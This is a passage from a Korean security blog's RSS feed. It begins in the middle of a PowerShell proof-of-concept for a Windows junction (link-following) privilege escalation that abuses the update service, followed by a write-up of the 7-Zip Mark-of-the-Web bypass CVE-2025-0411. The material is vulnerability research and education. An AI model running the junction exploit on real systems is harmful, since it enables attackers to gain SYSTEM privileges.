class="hljs-variable">$updateStackRealPath</span></span><span class="hljs-string">Proof File   : <span class="hljs-variable">$proofPath</span></span><span class="hljs-string">&quot;@</span><span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$logPath</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$log</span> <span class="hljs-literal">-Encoding</span> UTF8 <span class="hljs-literal">-Force</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[+] Simulation metadata saved.`n&quot;</span><span class="hljs-comment"># Attempt junction creation (non-admin safe)</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Attempting junction (no admin)...&quot;</span><span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$updateStackRealPath</span>)) {    <span class="hljs-keyword">try</span> {        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;cmd.exe /c mklink /J `&quot;<span class="hljs-variable">$updateStackRealPath</span>`&quot; `&quot;<span class="hljs-variable">$trapPath</span>`&quot;&quot;</span>        <span class="hljs-built_in">Start-Process</span> <span class="hljs-literal">-FilePath</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;/c mklink /J `&quot;<span class="hljs-variable">$updateStackRealPath</span>`&quot; `&quot;<span class="hljs-variable">$trapPath</span>`&quot;&quot;</span> <span class="hljs-literal">-NoNewWindow</span> <span class="hljs-literal">-Wait</span>        <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[+] Junction created: <span class="hljs-variable">$updateStackRealPath</span> &#x2192; <span class="hljs-variable">$trapPath</span>&quot;</span>    } <span class="hljs-keyword">catch</span> {        <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[-] Failed to create junction: <span class="hljs-variable">$_</span>&quot;</span>    }} <span class="hljs-keyword">else</span> {    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[!] Target path already exists: <span class="hljs-variable">$updateStackRealPath</span>&quot;</span>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[-] Cannot create junction unless folder is removed by SYSTEM update cleanup.&quot;</span>}<span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-comment"># Trigger update</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Triggering UsoClient.exe (StartScan)...&quot;</span><span class="hljs-keyword">try</span> {    <span class="hljs-built_in">Start-Process</span> UsoClient.exe <span class="hljs-literal">-ArgumentList</span> StartScan <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[+] UsoClient.exe started.`n&quot;</span>} <span class="hljs-keyword">catch</span> {    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[-] Failed to trigger UsoClient.exe: <span class="hljs-variable">$_</span>&quot;</span>}<span class="hljs-comment"># Monitor for SYSTEM process</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Monitoring for SYSTEM process MoUsoCoreWorker.exe...&quot;</span><span class="hljs-variable">$found</span> = <span class="hljs-variable">$false</span><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-le</span> <span class="hljs-number">6</span>; <span class="hljs-variable">$i</span>++) {    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Seconds</span> <span class="hljs-number">5</span>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[=] Attempt <span class="hljs-variable">$</span>{i}: Checking...&quot;</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;MoUsoCoreWorker&quot;</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue) {        <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[!] SYSTEM process detected: MoUsoCoreWorker.exe&quot;</span>        <span class="hljs-variable">$found</span> = <span class="hljs-variable">$true</span>        <span class="hljs-keyword">break</span>    }}<span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Seconds</span> <span class="hljs-number">5</span><span class="hljs-comment"># Check for success</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n[*] Analyzing payload execution...&quot;</span><span class="hljs-keyword">if</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$proofPath</span>) {    <span class="hljs-variable">$owner</span> = (<span class="hljs-built_in">Get-Acl</span> <span class="hljs-variable">$proofPath</span>).Owner    <span class="hljs-variable">$timestamp</span> = (<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$proofPath</span>).LastWriteTime    <span class="hljs-variable">$details</span> = <span class="hljs-string">@&quot;</span><span class="hljs-string">[+] Exploit successful</span><span class="hljs-string">Payload executed as: <span class="hljs-variable">$owner</span></span><span class="hljs-string">Last Modified: <span class="hljs-variable">$timestamp</span></span><span class="hljs-string">&quot;@</span>    <span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$verdictPath</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$true</span>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[&#x2713;] SUCCESS: SYSTEM likely accessed the payload.&quot;</span>} <span class="hljs-keyword">else</span> {    <span class="hljs-variable">$details</span> = <span class="hljs-string">@&quot;</span><span class="hljs-string">[!] Exploit failed</span><span class="hljs-string">No proof file found.</span><span class="hljs-string">Time: <span class="hljs-variable">$</span>(Get-Date)</span><span class="hljs-string">&quot;@</span>    <span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$verdictPath</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$false</span>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[&#x2717;] FAILURE: Payload was not executed by SYSTEM.&quot;</span>}<span class="hljs-comment"># Save evidence</span><span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$evidencePath</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$details</span> <span class="hljs-literal">-Encoding</span> UTF8<span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Forensic evidence saved: <span class="hljs-variable">$evidencePath</span>&quot;</span><span class="hljs-comment"># End</span><span class="hljs-built_in">Stop-Transcript</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n[&#x2713;] Simulation complete. See verbose log: <span class="hljs-variable">$verboseLog</span>`n&quot;</span></code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB41C; 2025&#xB144; 4&#xC6D4; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xACF5;&#xACA9;&#xC5D0; &#xB300;&#xD55C; &#xC644;&#xD654; &#xC870;&#xCE58;&#xB85C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB294; <code>C:\inetpub</code> &#xB4F1;&#xC758; &#xD3F4;&#xB354;&#xB97C; &#xBBF8;&#xB9AC; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xAE30;&#xBCF8; ACL&#xC744; &#xC801;&#xC6A9;&#xD574;&#xC11C; link following &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/Link-Following/">Link Following</category>
      
      <category domain="https://hackyboiz.github.io/tags/Symbolic-Link/">Symbolic Link</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/17/pwndorei/2025-04-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-0411 : 7-Zip의 Mark-of-the-Web (MotW) 우회로 인한 악성코드 감염</title>
      <link>https://hackyboiz.github.io/2025/04/16/OUYA77/2025-04-16/</link>
      <guid>https://hackyboiz.github.io/2025/04/16/OUYA77/2025-04-16/</guid>
      <pubDate>Wed, 16 Apr 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.trendmicro.com/ko_kr/research/25/a/cve-2025-0</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/ko_kr/research/25/a/cve-2025-0411-ukrainian-organizations-targeted.html">https://www.trendmicro.com/ko_kr/research/25/a/cve-2025-0411-ukrainian-organizations-targeted.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>7-Zip &lt; 24.09</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2024&#xB144; 9&#xC6D4;, Trend ZDI &#xC704;&#xD611; &#xD5CC;&#xD305;&#xD300;&#xC740; &#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xB294; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC778; CVE-2025-0411&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; 7-Zip &#xC555;&#xCD95; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xC6B0;&#xD06C;&#xB77C;&#xC774;&#xB098; &#xAE30;&#xAD00;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD558;&#xB294; SmokeLoader &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xCEA0;&#xD398;&#xC778;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB7EC;&#xC2DC;&#xC544; &#xC0AC;&#xC774;&#xBC84; &#xBC94;&#xC8C4; &#xADF8;&#xB8F9;&#xC774; &#xB7EC;&#xC2DC;&#xC544;-&#xC6B0;&#xD06C;&#xB77C;&#xC774;&#xB098; &#xBD84;&#xC7C1; &#xC911;&#xC5D0; &#xC0AC;&#xC774;&#xBC84; &#xC2A4;&#xD30C;&#xC774; &#xD65C;&#xB3D9;&#xC744; &#xC704;&#xD574; &#xC774; &#xC804;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC73C;&#xBA70;, &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC190;&#xC0C1;&#xB41C; &#xC774;&#xBA54;&#xC77C; &#xACC4;&#xC815;&#xACFC; homoglyph &#xACF5;&#xACA9;&#xC744; &#xD65C;&#xC6A9;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h3><p>Windows &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC778;&#xD130;&#xB137;&#xCC98;&#xB7FC; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xACF3;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xB54C;, &#xD30C;&#xC77C;&#xC5D0; <strong>Mark-of-the-Web (MotW)</strong>&#xC774;&#xB77C;&#xB294; &#xC77C;&#xC885;&#xC758; <strong>&#xCD9C;&#xCC98; &#xD45C;&#xC2DC;</strong>&#xB97C; &#xD569;&#xB2C8;&#xB2E4;.  &#xC774; &#xD45C;&#xC2DC;&#xB294; Windows&#xC640; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xC7A0;&#xC7AC;&#xC801;&#xC73C;&#xB85C; &#xC704;&#xD5D8;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC54C;&#xB824;&#xC8FC;&#xC5B4;, &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xD30C;&#xC77C;&#xC744; &#xC880; &#xB354; &#xC8FC;&#xC758;&#xD574;&#xC11C; &#xB2E4;&#xB8E8;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.  &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, MotW&#xAC00; &#xD45C;&#xC2DC;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB824;&#xACE0; &#xD558;&#xBA74; Windows Defender SmartScreen&#xC774; &#xD30C;&#xC77C;&#xC758; reputation&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xACBD;&#xACE0;&#xB97C; &#xBCF4;&#xB0B4; &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xAC10;&#xC5FC;&#xC744; &#xB9C9;&#xB294; &#xB370; &#xB3C4;&#xC6C0;&#xC744; &#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xC740; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC758; <code>Zone.Identifier</code> &#xC815;&#xBCF4;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xC815;&#xBCF4;&#xB294; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xC778;&#xD130;&#xB137;&#xC5D0;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xB2E4;&#xB294; &#xAC83;&#xC744; Windows&#xC5D0; &#xC54C;&#xB9BD;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/16/OUYA77/2025-04-16/image.png" alt="image.png"></p><p>&#xB610;&#xD55C; &#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xC740; MotW &#xD0DC;&#xADF8;&#xB85C; &#xC778;&#xD574; &#xB098;&#xD0C0;&#xB098;&#xB294; Windows Defender SmartScreen &#xBCF4;&#xC548; &#xACBD;&#xACE0;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xACE0;&#xB294; &#xC7A0;&#xC7AC;&#xC801;&#xC73C;&#xB85C; &#xC704;&#xD5D8;&#xD560; &#xC218; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xB85C;&#xBD80;&#xD130; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xB370; &#xB3C4;&#xC6C0;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/16/OUYA77/2025-04-16/image%201.png" alt="image.png"></p><p>&#xCC38;&#xACE0;&#xB85C; &#xD30C;&#xC77C;&#xC758; &#xC18D;&#xC131;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774;(&#xD30C;&#xB780;&#xBC15;&#xC2A4;) MotW &#xD0DC;&#xADF8; &#xC815;&#xBCF4;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xD0DC;&#xADF8;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589; &#xC2DC; &#xC704;&#xC640; &#xAC19;&#xC774; &#xACBD;&#xACE0; &#xD31D;&#xC5C5;&#xC774; &#xB098;&#xD0C0;&#xB0A9;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/16/OUYA77/2025-04-16/image%202.png" alt="image.png"></p><h3 id="Root-cause"><a href="#Root-cause" class="headerlink" title="Root cause"></a>Root cause</h3><p>&#xADF8;&#xB7EC;&#xB098; CVE-2025-0411 &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xAC00; 7-Zip&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD30C;&#xC77C;&#xC744; <strong>&#xC774;&#xC911; &#xC555;&#xCD95;</strong>&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC774;&#xB7EC;&#xD55C; MotW &#xBCF4;&#xD638;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>Windows&#xB294; &#xAC89;&#xC5D0; &#xC788;&#xB294; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC5D0;&#xB9CC; MotW &#xD45C;&#xC2DC;&#xB97C; &#xD558;&#xACE0;, &#xADF8; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xB4E4;&#xC5D0;&#xB294; MotW &#xD45C;&#xC2DC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</strong>  &#xBC14;&#xB85C; &#xC774; &#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC545;&#xC131; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC744; &#xC548;&#xCABD; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC5D0; &#xC228;&#xAE30;&#xACE0;, &#xAC89;&#xCABD; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; &#xBC30;&#xD3EC;&#xD568;&#xC73C;&#xB85C;&#xC368; Windows&#xC758; MotW &#xBCF4;&#xD638;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC774;&#xB807;&#xAC8C; &#xC774;&#xC911;&#xC73C;&#xB85C; &#xC555;&#xCD95;&#xB41C; &#xD30C;&#xC77C;&#xC744; 7-Zip&#xC73C;&#xB85C; &#xC5F4;&#xACE0; &#xC548;&#xCABD; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74;, MotW &#xACBD;&#xACE0;&#xB098; Windows Defender SmartScreen&#xC758; &#xAC80;&#xC0AC; &#xC5C6;&#xC774; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h3><p><img src="/2025/04/16/OUYA77/2025-04-16/image%203.png" alt="image.png"></p><p>&#xC774; &#xADF8;&#xB9BC;&#xC740; ZIP &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC774; &#xB2E4;&#xB978; ZIP &#xC555;&#xCD95; &#xD30C;&#xC77C; &#xC548;&#xC5D0; &#xC911;&#xCCA9;&#xB41C; CVE-2025-0411&#xC758; PoC &#xB370;&#xBAA8;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; PoC&#xC5D0;&#xC11C; &#xC911;&#xCCA9;&#xB41C; &#xC555;&#xCD95; &#xD30C;&#xC77C;(poc.outer.zip\poc.inner.zip) &#xB0B4;&#xBD80;&#xC5D0; &#xC788;&#xB294; <code>poc.bat</code> &#xD30C;&#xC77C;&#xC5D0;&#xB294; MotW &#xBCF4;&#xD638;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBCF4;&#xD638; &#xBD80;&#xC7AC;&#xB85C; &#xC778;&#xD574; &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xAC10;&#xC5FC; &#xC704;&#xD5D8;&#xC774; &#xD06C;&#xAC8C; &#xC99D;&#xAC00;&#xD558;&#xACE0; Windows Defender SmartScreen&#xC774; &#xD30C;&#xC77C;&#xC758; reputation &#xBC0F; &#xC11C;&#xBA85;&#xC744; &#xC81C;&#xB300;&#xB85C; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xC555;&#xCD95;&#xD574;&#xC81C; &#xD6C4; &#xC2E4;&#xD589;&#xC744; &#xD558;&#xBA74;, &#xACBD;&#xACE0; &#xD31D;&#xC5C5;&#xC774; &#xB728;&#xC9C0; &#xC54A;&#xACE0; &#xBC14;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC2E4;&#xD589;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/16/OUYA77/2025-04-16/image%204.png" alt="image.png"></p><p>&#xC774; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC6B0;&#xD06C;&#xB77C;&#xC774;&#xB098; &#xB2E8;&#xCCB4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD55C; SmokeLoader &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xCEA0;&#xD398;&#xC778;&#xC5D0; &#xC545;&#xC6A9;&#xB41C; &#xAC83;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCEA0;&#xD398;&#xC778;&#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xC6B0;&#xD06C;&#xB77C;&#xC774;&#xB098; &#xC815;&#xBD80; &#xAE30;&#xAD00;&#xACFC; &#xAE30;&#xC5C5;&#xC744; &#xD45C;&#xC801;&#xC73C;&#xB85C; &#xC0BC;&#xC544; &#xC0AC;&#xC774;&#xBC84; &#xC2A4;&#xD30C;&#xC774; &#xD65C;&#xB3D9;&#xC744; &#xC218;&#xD589;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC740; &#xC190;&#xC0C1;&#xB41C; &#xC774;&#xBA54;&#xC77C; &#xACC4;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131; &#xCCA8;&#xBD80; &#xD30C;&#xC77C;&#xC744; &#xC720;&#xD3EC;&#xD558;&#xACE0;, &#xD2B9;&#xD788; &#x201C;Homoglyph &#xACF5;&#xACA9;&#x201D;&#xC774;&#xB77C;&#xB294; &#xAE30;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD30C;&#xC77C; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xAD50;&#xBB18;&#xD558;&#xAC8C; &#xC704;&#xC7A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><blockquote><p><code>Homoglyph</code> &#xACF5;&#xACA9;&#xC740; &#xC2DC;&#xAC01;&#xC801;&#xC73C;&#xB85C; &#xC720;&#xC0AC;&#xD55C; &#xBB38;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC18D;&#xC774;&#xB294; &#xACF5;&#xACA9; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;.  &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD569;&#xBC95;&#xC801;&#xC778; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xB098; &#xD30C;&#xC77C;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xB3C4;&#xB85D; &#xC545;&#xC131; &#xCF58;&#xD150;&#xCE20;&#xB97C; &#xC704;&#xC7A5;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD074;&#xB9AD;&#xC744; &#xC720;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xB3C4;&#xBA54;&#xC778; &#xC774;&#xB984;&#xC5D0;&#xC11C; &#xB77C;&#xD2F4; &#xBB38;&#xC790; &#x201C;c&#x201D; &#xB300;&#xC2E0; &#xD0A4;&#xB9B4; &#xBB38;&#xC790; &#x201C;Es&#x201D;(&#x421; &#xB610;&#xB294; &#x441;)&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xB450; &#xBB38;&#xC790;&#xB294; &#xAC89;&#xBCF4;&#xAE30;&#xC5D0;&#xB294; &#xAC70;&#xC758; &#xB3D9;&#xC77C;&#xD558;&#xC9C0;&#xB9CC;, &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xBB38;&#xC790;&#xB85C; &#xC778;&#xC2DD;&#xD569;&#xB2C8;&#xB2E4;.  &#xC774;&#xB97C; &#xD1B5;&#xD574; &#x201C;api-microsoft[.]com&#x201D;&#xACFC; &#xAC19;&#xC774; &#xD569;&#xBC95;&#xC801;&#xC778; Microsoft &#xC0AC;&#xC774;&#xD2B8;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xB294; &#xC545;&#xC131; &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xC18D;&#xC544;&#xC11C; &#xAC1C;&#xC778; &#xC815;&#xBCF4;&#xB098; &#xC790;&#xACA9; &#xC99D;&#xBA85;(&#xC544;&#xC774;&#xB514;, &#xBE44;&#xBC00;&#xBC88;&#xD638;)&#xC744; &#xC785;&#xB825;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/dhmosfunk/7-Zip-CVE-2025-0411-POC">https://github.com/dhmosfunk/7-Zip-CVE-2025-0411-POC</a><br><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-045/">https://www.zerodayinitiative.com/advisories/ZDI-25-045/</a><br><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0411">https://nvd.nist.gov/vuln/detail/CVE-2025-0411</a><br><a href="https://securityonline.info/cve-2025-0411-7-zip-security-vulnerability-enables-code-execution-update-now/">https://securityonline.info/cve-2025-0411-7-zip-security-vulnerability-enables-code-execution-update-now/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/7-Zip/">7-Zip</category>
      
      <category domain="https://hackyboiz.github.io/tags/SmokeLoader/">SmokeLoader</category>
      
      <category domain="https://hackyboiz.github.io/tags/MotW/">MotW</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-0411/">CVE-2025-0411</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/16/OUYA77/2025-04-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (En)</title>
      <link>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/</link>
      <guid>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/</guid>
      <pubDate>Sun, 13 Apr 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (Ko) &amp;#x2190; Now&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.</description>
        
      
      
      
